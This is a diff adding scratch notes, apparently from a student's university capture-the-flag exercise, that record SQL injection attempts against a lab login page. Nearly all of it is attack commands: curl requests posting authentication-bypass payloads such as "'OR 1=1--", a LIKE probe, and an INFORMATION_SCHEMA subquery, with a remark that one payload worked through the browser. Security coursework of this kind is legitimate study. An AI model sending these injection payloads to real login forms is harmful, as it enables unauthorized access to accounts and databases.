@@ -1,0 +1,12 @@
+curl --cookie "CHALBROKER_USER_ID=tg1799" -d "email=admin&password='OR 1=1--'" "http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php" > blah
+firefox blah&
+
+
+curl --cookie "CHALBROKER_USER_ID=tg1799" -d "email=admin&password=1'OR LIKE '%a%" "http://offsec-chalbroker.osiris.cyber.nyu.edu:1240/login.php" > blah 
+grep "No such user\!" blah
+
+
+
+this worked worked but not with curl, probably something ot do with the '''s
+username: 'OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)#
+password: afdsf(doesn't matter)
